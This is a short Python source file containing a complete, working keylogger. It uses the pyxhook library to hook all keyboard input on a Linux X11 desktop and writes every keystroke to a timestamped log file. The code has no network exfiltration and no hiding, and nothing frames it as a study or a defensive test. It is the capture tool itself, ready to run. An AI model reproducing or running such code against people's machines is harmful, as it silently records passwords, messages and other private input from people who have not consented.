import os
from datetime import datetime
import pyxhook

class Keylogger:
    def __init__(self):
        # Set up the log file path
        self.log_file = f'{os.getcwd()}/{datetime.now().strftime("%d-%m-%Y|%H:%M")}.log'

    def on_key_press(self, event):
        # Log the key press to the file
        with open(self.log_file, "a") as f:
            if event.Key == 'P_Enter' :
                f.write('\n')
            else:
                f.write(f"{chr(event.Ascii)}")

    def start(self):
        # Create a hook manager object
        new_hook = pyxhook.HookManager()

        # Set up the key down event handler
        new_hook.KeyDown = self.on_key_press

        # Set the keyboard hook
        new_hook.HookKeyboard()

        try:
            # Start the hook
            new_hook.start()
        except KeyboardInterrupt:
            # If the user cancels, close the listener
            new_hook.cancel()
            return
        except Exception as ex:
            # Log exceptions to the file
            msg = f"Error while catching events:\n  {ex}"
            pyxhook.print_err(msg)
            with open(self.log_file, "a") as f:
                f.write(f"\n{msg}")

if __name__ == "__main__":
    # Create a new Keylogger object and start it
    keylogger = Keylogger()
    keylogger.start()
